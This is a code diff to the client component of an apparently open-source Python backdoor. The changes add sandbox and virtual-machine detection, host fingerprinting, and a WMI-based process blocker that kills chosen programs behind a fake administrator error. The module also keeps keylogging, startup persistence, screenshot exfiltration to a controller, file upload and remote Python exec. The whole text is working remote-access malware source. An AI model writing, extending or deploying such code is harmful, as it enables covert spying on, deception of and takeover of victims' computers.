@@ -5,11 +5,15 @@ https://github.com/xp4xbox/Python-Backdoor
 """
 
 import ctypes
+import socket
 import subprocess
 import threading
+import platform
 from io import BytesIO, StringIO
 
 import pyscreeze
+import pythoncom
+import wmi
 
 from src import helper, errors
 from src.client import persistence
@@ -17,26 +21,73 @@ from src.defs import *
 from src.client.keylogger import Keylogger
 
 
-def disable_process(process):
-    subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                     stdin=subprocess.PIPE, shell=True)
-
-    persistence.vbs_block_process(process,
-                                  popup=[f"{process} has been disabled by your administrator", process, "3", "16"])
-
-
-def message_box(message, title="Message"):
-    threading.Thread(target=ctypes.windll.user32.MessageBoxA(0, message, title, 0x0 | 0x40)).start()
+def message_box(message, title="Message", values=0x40000):
+    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, values)).start()
 
 
 def lock():
     ctypes.windll.user32.LockWorkStation()
 
 
+def get_info():
+    _hostname = socket.gethostname()
+    _platform = f"{platform.system()} {platform.release()}"
+
+    if persistence.detect_sandboxie():
+        _platform += " (Sandboxie) "
+    if persistence.detect_vm():
+        _platform += " (Virtual Machine) "
+
+    info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
+            "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
+            "machine": platform.machine(), "processor": platform.processor()}
+
+    return info
+
+
 class Control:
     def __init__(self, socket):
         self.socket = socket
         self.logger = Keylogger()
+        self.disabled_processes = {}
+
+    def toggle_disable_process(self, process):
+        process = process.lower()
+
+        if process in self.disabled_processes.keys() and self.disabled_processes.get(process):
+            self.disabled_processes[process] = False
+            self.socket.send_json(SUCCESS, f"process {process} re-enabled")
+            return
+        else:
+            self.disabled_processes[process] = True
+            self.socket.send_json(SUCCESS, f"process {process} disabled")
+
+        # kill process if its running
+        subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                         stdin=subprocess.PIPE, shell=True)
+
+        def block_process(fake_error_message=True):
+            pythoncom.CoInitialize()
+
+            c = wmi.WMI(moniker="winmgmts:{impersonationLevel=impersonate}!//./root/cimv2")
+
+            watcher = c.watch_for(raw_wql="SELECT * from __instancecreationevent within 1 WHERE TargetInstance isa "
+                                          "'Win32_Process'")
+
+            while True:
+                process_wmi = watcher()
+
+                if not self.disabled_processes.get(process):
+                    break
+
+                if process_wmi.Name.lower() == process:
+                    process_wmi.Terminate()
+
+                    if fake_error_message:
+                        message_box(f"{process} has been disabled by your administrator", title=process,
+                                    values=0x0 | 0x10 | 0x40000)
+
+        threading.Thread(target=block_process, daemon=True).start()
 
     def add_startup(self, remove=False):
         try:
@@ -46,11 +97,12 @@ class Control:
                 persistence.add_startup()
 
             self.socket.send_json(SUCCESS)
-        except Exception as e:
+        except errors.ClientSocket.Persistence.StartupError as e:
             self.socket.send_json(ERROR, str(e))
 
     def close(self):
         self.socket.close()
+        sys.exit(0)
 
     def keylogger_dump(self):
         try:
@@ -72,8 +124,9 @@ class Control:
         image = pyscreeze.screenshot()
         with BytesIO() as _bytes:
             image.save(_bytes, format="PNG")
+            image_bytes = _bytes.getvalue()
 
-        self.socket.sendall_json(SERVER_SCREENSHOT, image.getvalue(), is_bytes=True)
+        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, is_bytes=True)
 
     def shutdown(self, shutdown_type, timeout):
         command = f"shutdown {shutdown_type} -f -t {str(timeout)}"
@@ -122,12 +175,13 @@ class Control:
                 os.chdir(current_dir)  # change directory back to original
                 break
 
-    def upload(self, buffer):
+    def upload(self, buffer, file_path):
         output = self.socket.recvall(buffer)
 
         try:
-            with open(output, "wb") as file:
+            with open(file_path, "wb") as file:
                 file.write(output)
+
             self.socket.send_json(SUCCESS)
         except Exception as e:
             self.socket.send_json(ERROR, f"Could not open file {e}")
@@ -150,7 +204,7 @@ class Control:
                 redirected_output = sys.stdout = StringIO()
 
                 try:
-                    exec(command)
+                    exec(command["value"])
                     print()
                     error = None
                 except Exception as e:
